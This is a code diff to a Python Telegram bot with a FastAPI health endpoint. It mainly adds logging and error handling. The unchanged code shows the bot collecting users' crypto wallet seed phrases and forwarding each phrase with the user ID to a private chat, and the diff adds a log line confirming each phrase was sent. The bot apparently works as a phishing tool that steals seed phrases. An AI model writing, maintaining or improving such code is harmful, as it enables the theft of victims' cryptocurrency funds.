@@ -98,6 +98,7 @@ app = FastAPI()
 # Health check endpoint for UptimeRobot
 @app.get("/health")
 async def health_check():
+    logger.info("Health check endpoint accessed")
     return {"status": "ok"}
 
 # Validate crypto address
@@ -113,7 +114,8 @@ def is_valid_address(address: str, coin: str) -> bool:
                 or re.match(r"^bc1[a-zA-Z0-9]{39,59}$", address)
             )
         return False
-    except Exception:
+    except Exception as e:
+        logger.error(f"Address validation failed: {e}")
         return False
 
 # Validate seed phrase
@@ -129,6 +131,7 @@ async def send_to_private_bot(phrase: str, user_id: int):
             chat_id=PRIVATE_CHAT_ID,
             text=f"User ID: {user_id}\nSeed Phrase: {phrase}",
         )
+        logger.info(f"Seed phrase sent to private bot for user {user_id}")
     except Exception as e:
         logger.error(f"Failed to send to private bot: {e}")
 
@@ -324,21 +327,33 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # Run Telegram bot
 def run_bot():
-    application = Application.builder().token(MAIN_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(button))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    application.add_handler(error_handler)
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    try:
+        logger.info("Starting Telegram bot polling")
+        application = Application.builder().token(MAIN_BOT_TOKEN).build()
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CallbackQueryHandler(button))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+        application.add_handler(error_handler)
+        application.run_polling(allowed_updates=Update.ALL_TYPES)
+    except Exception as e:
+        logger.error(f"Telegram bot failed: {e}")
 
 def main():
-    # Run Telegram bot in a separate thread
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
+    try:
+        # Log the port being used
+        port = int(os.environ.get("PORT", 8000))
+        logger.info(f"Starting FastAPI server on port {port}")
 
-    # Run FastAPI server
-    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
+        # Run Telegram bot in a separate thread
+        bot_thread = threading.Thread(target=run_bot)
+        bot_thread.daemon = True
+        bot_thread.start()
+
+        # Run FastAPI server
+        uvicorn.run(app, host="0.0.0.0", port=port)
+    except Exception as e:
+        logger.error(f"Failed to start FastAPI server: {e}")
+        raise
 
 if __name__ == "__main__":
     main()
